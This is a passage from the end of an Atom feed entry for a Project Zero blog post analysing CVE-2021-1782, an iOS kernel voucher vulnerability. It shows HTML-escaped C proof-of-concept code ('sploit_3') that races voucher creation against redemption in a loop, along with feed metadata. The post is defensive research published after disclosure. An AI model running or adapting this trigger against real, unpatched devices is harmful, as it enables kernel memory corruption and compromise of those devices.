class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_t voucher_port &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;create_voucher_from_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_port_deallocate&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_task_self&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;voucher_port&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;sploit_3&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;// choose a userdata size:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint32_t userdata_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;arc4random&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;2040&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; userdata_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(~&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c16&quot;&gt;&amp;quot;userdata size: 0x%x\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;userdata_buffer &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_buffer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_buffer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;arc4random&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;// build the templates: &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; single_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;create_single_variable_userdata_voucher_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_buffer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;single_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; redeem_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_buffer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;userdata_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;userdata_buffer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t single_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;single_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;single_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_t redeem_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_create&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;single_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pthread_join&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redeem_recipe_thread&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;single_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redeem_recipe_template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;argc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;argv&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; sploit_3&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;();&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/5933797027217125856/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html' title='CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers'/><author><name>Anonymous</name><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/blank.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s72-c/image1%20%283%29%281%29.png" height="72" width="72"/><thr:total>0</thr:total></entry>